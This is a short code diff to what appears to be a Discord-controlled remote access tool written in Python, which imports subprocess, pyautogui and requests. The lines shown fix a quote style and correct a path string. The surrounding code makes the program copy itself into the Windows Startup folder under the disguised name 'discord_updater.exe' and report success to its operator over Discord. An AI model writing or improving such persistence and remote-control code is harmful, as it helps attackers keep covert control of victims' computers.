@@ -1,7 +1,7 @@
 import os, discord, subprocess, requests, pyautogui, re, shutil, json, sys
 
 def resource_path(relative_path):
-    if hasattr(sys, '_MEIPASS'):
+    if hasattr(sys, "_MEIPASS"):
         return os.path.join(sys._MEIPASS, relative_path)
     return os.path.join(os.path.abspath("."), relative_path)
 
@@ -160,7 +160,7 @@ async def on_message(message):
         path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
         try:
             shutil.copyfile(os.path.join(os.getcwd(), __file__), os.path.join(path, "discord_updater.exe"))
-            embed = discord.Embed(title="Startup", description=f"```{os.path.join(path, 'discord.exe')}```", color=0xfafafa)
+            embed = discord.Embed(title="Startup", description=f"```{os.path.join(path, 'discord_updater.exe')}```", color=0xfafafa)
             await message.reply(embed=embed)
         except:
             embed = discord.Embed(title="Error", description=f"```Failed to add to startup```", color=0xfafafa)
